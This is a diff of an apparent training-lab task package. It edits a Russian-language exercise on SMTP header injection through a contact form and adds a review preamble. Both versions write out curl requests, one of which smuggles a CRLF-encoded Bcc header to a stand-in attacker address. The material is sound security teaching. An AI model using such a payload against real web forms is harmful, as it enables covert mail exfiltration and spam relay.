@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: SMTP-инъекция\n\nФорма POST /contact ставит поле email в заголовок To письма без фильтрации CRLF.\nДобейся, чтобы письмо ушло на скрытый адрес-эксфильтратор, и прочитай его.\n\n1. Обычная отправка:\n   curl -s -X POST 'https://app.target/contact' --data 'email=me@example.com&message=hi'\n2. Вставь перевод строки и Bcc:\n   curl -s -X POST 'https://app.target/contact' --data-binary 'email=me@example.com%0aBcc:exfil@attacker.test&message=hi'\n3. Сервер вернёт адрес скрытого получателя (флаг) — запиши его в found.txt и набери check.\n"
+      "text": "# Практика: SMTP-инъекция\n## Повторение (`web-injection-protocol`)\n\nПрежде чем браться за «Email / SMTP injection через веб-формы: BCC и подмена заголовков», повтори приём из `web-injection-protocol` — «Инъекции на уровне протокола: заголовки, почта, XML, OData». Карта инъекций, которые живут не в SQL, а в разметке протоколов: CRLF в заголовках, SMTP-поля, XML/XPath и OData-фильтры.\nСначала маленький шаг тем же приёмом:\n\n    head -n 5 task.md\n\nЭто возвращает тебя в контекст предшествующего урока, и уже затем — собственно задача ниже.\n\n\nФорма POST /contact ставит поле email в заголовок To письма без фильтрации CRLF.\nДобейся, чтобы письмо ушло на скрытый адрес-эксфильтратор, и прочитай его.\n\n1. Обычная отправка:\n   curl -s -X POST 'https://app.target/contact' --data 'email=me@example.com&message=hi'\n2. Вставь перевод строки и Bcc:\n   curl -s -X POST 'https://app.target/contact' --data-binary 'email=me@example.com%0aBcc:exfil@attacker.test&message=hi'\n3. Сервер вернёт адрес скрытого получателя (флаг) — запиши его в found.txt и набери check.\n"
     }
   ],
   "tools": {
